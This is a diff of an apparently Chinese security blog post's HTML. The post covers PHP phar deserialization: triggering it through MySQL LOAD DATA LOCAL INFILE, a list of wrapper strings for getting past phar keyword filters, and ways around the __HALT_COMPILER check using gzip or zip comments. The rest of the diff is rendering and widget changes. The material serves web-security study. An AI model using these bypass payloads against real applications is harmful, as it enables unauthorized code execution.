-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Destruct called'</span>;<br>    }<br>    }<br>    <span class="hljs-comment">// $filename = 'compress.zlib://phar://phar.phar/test.txt';</span><br>    <span class="hljs-comment">// file_get_contents($filename); </span><br>    <span class="hljs-variable">$m</span> = <span class="hljs-title function_ invoke__">mysqli_init</span>();<br>    <span class="hljs-title function_ invoke__">mysqli_options</span>(<span class="hljs-variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">mysqli_real_connect</span>(<span class="hljs-variable">$m</span>, <span class="hljs-string">'localhost'</span>, <span class="hljs-string">'root'</span>, <span class="hljs-string">'root'</span>, <span class="hljs-string">'test'</span>, <span class="hljs-number">3306</span>);<br>    <span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$m</span>, <span class="hljs-string">'LOAD DATA LOCAL INFILE \'phar://phar.phar/test.txt\' INTO TABLE users  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment">// $filename = 'compress.zlib://phar://phar.phar/test.txt';</span>
+    <span class="token comment">// file_get_contents($filename); </span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">mysqli_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mysqli_options</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token constant">MYSQLI_OPT_LOCAL_INFILE</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">mysqli_real_connect</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">,</span> <span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'LOAD DATA LOCAL INFILE \'phar://phar.phar/test.txt\' INTO TABLE users  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>再配置一下mysqld。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[mysqld]<br>local-infile=1<br>secure_file_priv=""<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">[mysqld]
+local-infile=1
+secure_file_priv=""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>这里由于我懒得配置mysql了，就借用师傅的图吧。。。</p>
-<p><img src="image-20231113222019397.png" alt="image-20231113222019397"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231113222019397.png" alt="image-20231113222019397"></p>
 <p>可以看到mysql进行phar文件读取时成功触发反序列化。</p>
 <h1>0x04 实战例题</h1>
 <p>等遇到的时候补充吧。。。</p>
 <h1>0x05 绕过总结</h1>
 <h2 id="5-1-phar关键词绕过">5.1 phar关键词绕过</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过<br><br>compress.bzip://phar:///test.phar/test.txt<br>compress.bzip2://phar:///home/sx/test.phar/test.txt<br>compress.zlib://phar:///home/sx/test.phar/test.txt<br>php://filter/resource=phar:///test.phar/test.txt<br>// 还可以使用伪协议的方法绕过<br>php://filter/read=convert.base64-encode/resource=phar://phar.phar<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
+
+compress.bzip://phar:///test.phar/test.txt
+compress.bzip2://phar:///home/sx/test.phar/test.txt
+compress.zlib://phar:///home/sx/test.phar/test.txt
+php://filter/resource=phar:///test.phar/test.txt
+// 还可以使用伪协议的方法绕过
+php://filter/read=convert.base64-encode/resource=phar://phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="5-2-HALT-COMPILER关键词绕过">5.2 __HALT_COMPILER关键词绕过</h2>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/&lt;/?|php|HALT_COMPILER/i"</span>,<span class="hljs-variable">$filename</span>){<br>    <span class="hljs-keyword">die</span>();<br>}<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&lt;/?|php|HALT_COMPILER/i"</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>因为phar中的<code>a stub</code>字段必须以<code>__HALT_COMPILER();</code>字符串来结尾，否则<code>phar</code>扩展将无法识别这个文件为<code>phar</code>文件，所以这段字符串不能省略，只能绕过</p>
 <h3 id="方法一：">方法一：</h3>
 <p>首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了<code>__HALT_COMPILER()</code>，将 phar.gz 后缀改为 png（png文件可以上传）</p>
-<p><img src="image-20231114182402667.png" alt="image-20231114182402667"></p>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231114182402667.png" alt="image-20231114182402667"></p>
 <p>文件上传成功后，利用文件包含漏洞包含文件</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">file_un.php?filename=phar:<span class="hljs-comment">//pic/phar.phar.gz/phar.phar</span><br><span class="hljs-comment"># file_un.php中包含__destruct并且可以被触发</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20231114182512761.png" alt="image-20231114182512761"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">file_un<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment">//pic/phar.phar.gz/phar.phar</span>
+<span class="token comment"># file_un.php中包含__destruct并且可以被触发</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/2023/11/13/phar-fan-xu-lie-hua-xue-xi/image-20231114182512761.png" alt="image-20231114182512761"></p>
 <h3 id="方法二：">方法二：</h3>
 <p>将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar_file</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$phar_file</span>;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">'1.zip'</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>); <br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">'crispr.txt'</span>, <span class="hljs-string">'file content goes here'</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$phar_file</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$phar_file</span><span class="token punctuation">;</span>
+    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.zip'</span><span class="token punctuation">,</span><span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">CREATE</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'crispr.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file content goes here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">setArchiveComment</span><span class="token punctuation">(</span><span class="token variable">$phar_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这篇文章在php源码角度给出分析：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240007">https://www.anquanke.com/post/id/240007</a></p>
 <blockquote>
 <p>phar反序列化过程中，对metadata进行解析的时候会进行<code>php_var_unserialize()</code>将Phar中的metadata进行反序列化</p>
@@ -738,100 +862,7 @@ phar文件本质上是一种压缩文件，其中每个被压缩文件的权限�
                 </div>
             </div>
             
-                <style>
-    #reward {
-        margin: 40px 0;
-        text-align: center;
-    }
-
-    #reward .reward-link {
-        font-size: 1.4rem;
-        line-height: 38px;
-    }
-
-    #reward .btn-floating:hover {
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #rewardModal {
-        width: 320px;
-        height: 350px;
-    }
-
-    #rewardModal .reward-title {
-        margin: 15px auto;
-        padding-bottom: 5px;
-    }
-
-    #rewardModal .modal-content {
-        padding: 10px;
-    }
-
-    #rewardModal .close {
-        position: absolute;
-        right: 15px;
-        top: 15px;
-        color: rgba(0, 0, 0, 0.5);
-        font-size: 1.3rem;
-        line-height: 20px;
-        cursor: pointer;
-    }
-
-    #rewardModal .close:hover {
-        color: #ef5350;
-        transform: scale(1.3);
-        -moz-transform:scale(1.3);
-        -webkit-transform:scale(1.3);
-        -o-transform:scale(1.3);
-    }
-
-    #rewardModal .reward-tabs {
-        margin: 0 auto;
-        width: 210px;
-    }
-
-    .reward-tabs .tabs {
-        height: 38px;
-        margin: 10px auto;
-        padding-left: 0;
-    }
-
-    .reward-content ul {
-        padding-left: 0 !important;
-    }
-
-    .reward-tabs .tabs .tab {
-        height: 38px;
-        line-height: 38px;
-    }
-
-    .reward-tabs .tab a {
-        color: #fff;
-        background-color: #ccc;
-    }
-
-    .reward-tabs .tab a:hover {
-        background-color: #ccc;
-        color: #fff;
-    }
-
-    .reward-tabs .wechat-tab .active {
-        color: #fff !important;
-        background-color: #22AB38 !important;
-    }
-
-    .reward-tabs .alipay-tab .active {
-        color: #fff !important;
-        background-color: #019FE8 !important;
-    }
-
-    .reward-tabs .reward-img {
-        width: 210px;
-        height: 210px;
-    }
-</style>
-
-<div id="reward">
+                <div id="reward">
     <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
 
     <!-- Modal Structure -->
@@ -872,6 +903,275 @@ phar文件本质上是一种压缩文件，其中每个被压缩文件的权限�
     
 
     
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
+        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
+        serverURLs: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
 
     
 
@@ -992,9 +1292,12 @@ phar文件本质上是一种压缩文件，其中每个被压缩文件的权限�
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-<!-- 代码语言 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+
+
+<!-- 代码语言 -->
 
 
 <!-- 代码块复制 -->
@@ -1004,7 +1307,6 @@ phar文件本质上是一种压缩文件，其中每个被压缩文件的权限�
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
     </div>
@@ -1034,19 +1336,6 @@ phar文件本质上是一种压缩文件，其中每个被压缩文件的权限�
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
             headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
         });
 
         // Set scroll toc fixed.
@@ -1110,89 +1399,42 @@ phar文件本质上是一种压缩文件，其中每个被压缩文件的权限�
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
 
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
                 <span id="year">2019-2024</span>
             
-            <span id="year">2019</span>
             <a href="/about" target="_blank">hybcx</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
             <br>
             
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">861.1k</span>
             
             
             
+                
             
             
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
             </span>
             
             
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
             </span>
             
             <br>
+
+            <!-- 运行天数提醒. -->
             
             <br>
             
@@ -1339,6 +1581,30 @@ $(function () {
 });
 </script>
 
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
     <!-- 回到顶部按钮 -->
 <div id="backTop" class="top-scroll">
     <a class="btn-floating btn-large waves-effect waves-light" href="#!">
@@ -1353,6 +1619,33 @@ $(function () {
     <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
     <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
 
     <!-- Baidu Analytics -->
 
@@ -1380,10 +1673,39 @@ $(function () {
     
 
     
+        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
+        <script>
+            $(document).ready(function () {
+                setInterval(change_Tidio, 50);
+                function change_Tidio() {
+                    var tidio=$("#tidio-chat iframe");
+                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
+                        document.getElementById("tidio-chat-iframe").style.right="-15px";
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
+                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                    }
+                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                    }
+                }
+            });
+        </script>
+    
 
     
 
-	
+    <!--腾讯兔小巢-->
+    
     
 
     
@@ -1394,6 +1716,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 </html>
